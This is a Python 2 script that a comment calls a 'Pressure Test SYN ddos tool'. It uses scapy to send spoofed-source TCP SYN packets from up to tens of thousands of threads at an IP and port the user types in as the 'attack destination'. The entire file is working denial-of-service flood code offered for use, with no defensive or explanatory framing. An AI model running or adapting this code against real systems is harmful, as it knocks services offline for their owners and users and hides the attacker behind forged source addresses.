#!/usr/bin/env python
import socket
import time
import threading
import thread
from scapy.all import *
#Pressure Test SYN ddos tool

#SPORT=[1024,1025,1026,1027,1028,1029]

def initSport(startSport,numThreads):
    minSport=[]
    for i in range(0,numThreads):
        print i
        print startSport
        minSport.append(startSport+i)
        print minSport[i]
    return minSport


class myThread(threading.Thread):
    def __init__(self, func, args, name=''):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
        self.name = name
#        print self.func
        print self.args
        print type(self.args)
    
    def run(self):
        apply(self.func, self.args)
    
def conn_thread(j, srcport, dstip, dstport):  
        try:
#            data = struct.pack('=BHI', 0x12, 20, 1000)
            print 'thread %d start\n' %j
            stri='20.20.'+'%d'%j +'.1/24'
	    print stri
            mypacket=IP(src=stri,dst=dstip)/TCP(sport=srcport, dport=dstport, flags="S")
            send(mypacket)
#			print "Send buf OK!,conn=%d\n"
#			data=s.recv(1024)
#			print len(data)
#			if len(data) > 0:
#			    print data
#			socks.append(s)
	except Exception,ex:
	    print "Could not connect to server or send error:%s"%ex
        print ' thread %d\n run over'%j
#end 

def main():
#    conn_th=threading.Thread(target=conn_thread,args=())
#    send_th=threading.Thread(target=send_thread,args=())
#    thread.start_new_thread(conn_thread,())
#    thread.start_new_thread(send_thread,())
    sport = int(raw_input("input the malformed src-port you want\n"))
    MAX = int(raw_input("input the attack threads num you want, better to below 100,000 \n"))
    attackIP = raw_input("input the attack destination ip\n")
    attackPORT = int(raw_input("input the attack destination port\n"))
    SPORT = initSport(sport, MAX)
    threads = []
    for i in range(0,MAX):
        print type(i)
        t = myThread(conn_thread, (i, SPORT[i], attackIP, attackPORT), conn_thread.__name__)
        threads.append(t)
    print "already"
    
    for i in range(0,MAX):
        threads[i].setDaemon(True)
        threads[i].start()
    # sub the main thread num
    print "current has %d threads" % (threading.activeCount() - 1)

    for i in range(0,MAX):
        threads[i].join()# join means wait until the child thread run over ,then the main thread start continue run
    
    print 'all done'
#    conn_thread()
#    send_thread()
    print "lyue"
main()

